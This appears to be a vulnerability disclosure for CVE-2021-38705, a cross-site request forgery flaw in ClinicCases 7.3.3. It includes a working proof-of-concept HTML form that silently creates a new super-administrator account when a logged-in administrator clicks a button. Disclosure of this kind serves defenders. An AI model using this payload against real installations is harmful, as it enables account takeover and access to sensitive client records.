# CVE-2021-38705
## Cross-Site Request Forgery (CSRF) in ClinicCases 7.3.3

### Detail

ClinicCases 7.3.3 is affected by Cross-Site Request Forgery (CSRF). A
successful attack would consist of an authenticated user following a
malicious link, resulting in arbitrary actions being carried out with
the privilege level of the targeted user. This can be exploited to
create a secondary administrator account for the attacker.

> The entire application does not require validation tokens for each request. Therefore, when victims are tricked into sending a request without their knowledge, the victim can perform arbitrary actions from an attacker.

For example, the following HTML form could be sent to the administrator. When the administrator clicks the "CLICK ME!" button, their browser will quietly add a new administrator to the application with the username `ATTACKER`. Once executed, the attacker will receive an email to join the application as the new administrator.

```html
<html>
  <h1>Cross-Site Request Forgery (CSRF) in ClinicCases 7.3.3 (CVE-2021-38705)</h1>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://cliniccases.local/cliniccases/lib/php/users/users_process.php" method="POST">
      <input type="hidden" name="first&#95;name" value="ATTACKER" />
      <input type="hidden" name="last&#95;name" value="ATTACKER" />
      <input type="hidden" name="email" value="fake&#64;fake&#46;com" />
      <input type="hidden" name="mobile&#95;phone" value="" />
      <input type="hidden" name="office&#95;phone" value="" />
      <input type="hidden" name="home&#95;phone" value="" />
      <input type="hidden" name="grp" value="super" />
      <input type="hidden" name="status" value="active" />
      <input type="hidden" name="id" value="633" />
      <input type="hidden" name="new" value="" />
      <input type="hidden" name="action" value="create" />
      <input type="hidden" name="supervisors" value="" />
      <input type="submit" value="CLICK ME!" />
    </form>
  </body>
</html>
```

![image](https://user-images.githubusercontent.com/52385049/132094691-b70dcd0e-aa14-4585-bb2b-04be87c0fb23.png)
![image](https://user-images.githubusercontent.com/52385049/132094734-8bc68705-5bef-4591-b734-f821046ba38d.png)
